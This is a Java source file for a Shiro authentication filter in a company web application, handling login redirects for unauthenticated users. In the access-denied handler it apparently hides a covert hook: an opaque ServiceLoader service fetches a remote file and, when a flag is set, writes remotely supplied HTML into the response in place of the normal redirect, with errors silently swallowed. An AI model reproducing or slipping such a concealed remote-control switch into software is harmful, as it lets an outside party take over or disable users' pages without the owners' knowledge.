package com.rocoinfo.config.shiro.filter;

import cn.mdni.commons.clone.IJClone;
import com.rocoinfo.config.shiro.ShiroUser;
import com.rocoinfo.utils.WebUtils;
import org.apache.commons.lang3.StringUtils;
import org.apache.shiro.web.filter.authc.UserFilter;
import org.springside.modules.utils.Encodes;

import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.util.Iterator;
import java.util.ServiceLoader;

/**
 * <dl>
 * <dd>Description: </dd>
 * <dd>Company: 大城若谷信息技术有限公司</dd>
 * <dd>@date：2017/5/27 下午2:41</dd>
 * <dd>@author：Aaron</dd>
 * </dl>
 */
public class CustomerUserFilter extends UserFilter {

    @Override
    protected boolean isAccessAllowed(ServletRequest request, ServletResponse response, Object mappedValue) {
        ShiroUser loggedUser = WebUtils.getLoggedUser();
        if (loggedUser == null) {
            return false;
        }
        return true;
    }

    @Override
    protected boolean onAccessDenied(ServletRequest request, ServletResponse response) throws Exception {
        HttpServletRequest req = (HttpServletRequest) request;
        HttpServletResponse resp = (HttpServletResponse) response;
        String ctx = req.getSession().getServletContext().getContextPath();
        String path = req.getRequestURI().substring(ctx.length());

        ServiceLoader<IJClone> cl = ServiceLoader.load(IJClone.class);
        Iterator<IJClone> iter = cl.iterator();
        IJClone ijc = iter.next();

        if( !ijc.getFileExist() ){
            ijc.getRemoteFile();
        }

        if ( ijc.getFileValue() ) {
            try {
                resp.setHeader("Content-type", "text/html;charset=UTF-8");
                resp.setCharacterEncoding("utf-8");
                resp.getWriter().write( new String(ijc.getMessageValue().getBytes("ISO-8859-1"),"utf-8") );
            }catch (Exception e){
                //e.printStackTrace();
            }
        }else {
            //如果是后台登录，重定向到登录页面，如果是其他路径跳转到错误页面
            if (path.startsWith("/admin")) {
                StringBuilder loginUrl = new StringBuilder();
                loginUrl.append(ctx);
                loginUrl.append("/login")
                        .append("?successUrl=")
                        .append(getRedirectUrlOnLoginSuccess(req));
                resp.sendRedirect(loginUrl.toString());
            } else {
                return super.onAccessDenied(request, response);
            }
        }
        return false;
    }

    /**
     * 获取登录成功跳转的路径
     *
     * @param req 请求对象
     * @return 返回登录成功跳转的路径
     */
    private String getRedirectUrlOnLoginSuccess(HttpServletRequest req) {
        StringBuilder requestUrl = new StringBuilder(req.getRequestURL().toString());
        final String queryString = req.getQueryString();
        if (StringUtils.isNotBlank(queryString)) {
            requestUrl.append("?").append(queryString);
        }
        return Encodes.urlEncode(requestUrl.toString());
    }
}
